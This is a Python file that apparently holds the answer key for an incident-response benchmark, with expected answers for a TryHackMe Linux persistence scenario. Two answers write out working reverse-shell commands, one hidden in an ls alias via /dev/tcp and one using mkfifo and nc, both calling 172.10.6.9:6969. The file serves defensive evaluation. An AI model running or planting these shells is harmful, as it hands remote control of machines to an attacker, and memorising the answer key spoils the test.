"""
Ground truth data for IRBench subtask scoring.

Expected answers and verification methods are keyed by
``(scenario_id, subtask_number)``.  Entries are populated
incrementally as scenarios are solved.
"""
from dataclasses import dataclass


@dataclass
class GroundTruthEntry:
    """
    Expected answer for a single subtask.

    :param answer: the expected answer string (for
        detection / investigation subtasks)
    :param match_type: how to compare the agent's answer:
        ``exact`` — case-insensitive exact match
        ``substring`` — expected is a substring of agent answer
        ``regex`` — expected is a regex pattern
        ``verification`` — run verify_command via SSH
        ``manual`` — no automated scoring
    :param verify_command: shell command to run on the
        target via SSH; the subtask passes when the
        command exits with code 0 or outputs ``PASS``
    """

    answer: str = ""
    match_type: str = "substring"
    verify_command: str = ""


# ------------------------------------------------------------------
# Ground truth entries keyed by (scenario_id, subtask_number).
#
# Start with Scenario 4 (Tardigrade, TryHackMe, Medium, Linux)
# as the first integration test target.  Expand as scenarios
# are solved.
# ------------------------------------------------------------------
GROUND_TRUTH: dict[
    tuple[int, int], GroundTruthEntry
] = {
    # ── Scenario 4: Tardigrade (TryHackMe, Medium) ──────
    (4, 1): GroundTruthEntry(
        answer="Ubuntu 20.04.6 LTS",
        match_type="substring",
    ),
    (4, 2): GroundTruthEntry(
        answer=".bad_bash",
        match_type="substring",
    ),
    (4, 3): GroundTruthEntry(
        answer=(
            "ls='(bash -i >& /dev/tcp/172.10.6.9/6969"
            " 0>&1 & disown) 2>/dev/null; ls "
            "--color=auto'"
        ),
        match_type="substring",
    ),
    (4, 4): GroundTruthEntry(
        answer=(
            "/usr/bin/rm /tmp/f;/usr/bin/mkfifo "
            "/tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i "
            "2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f"
        ),
        match_type="substring",
    ),
    (4, 5): GroundTruthEntry(
        answer="Ncat: TIMEOUT.",
        match_type="substring",
    ),
}
